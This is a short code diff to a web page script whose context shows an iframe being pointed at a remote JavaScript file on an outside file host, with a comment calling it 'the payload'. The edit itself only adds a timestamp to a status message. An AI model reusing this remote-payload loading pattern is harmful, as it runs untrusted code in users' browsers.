@@ -15,7 +15,9 @@
     iframe.onload = () => {
       // Redirects to the payload
       iframe.contentWindow.location.href = 'https://files.catbox.moe/cwedrd.js';
-      document.getElementById("status").textContent = "Spilling 250ml...";
+      const now = () => `${Math.floor(performance.now())}ms`;
+      document.getElementById("status").textContent = `Spilling 250ml... [${now()}]`;
+
     };
 
     iframe.onerror = () => {
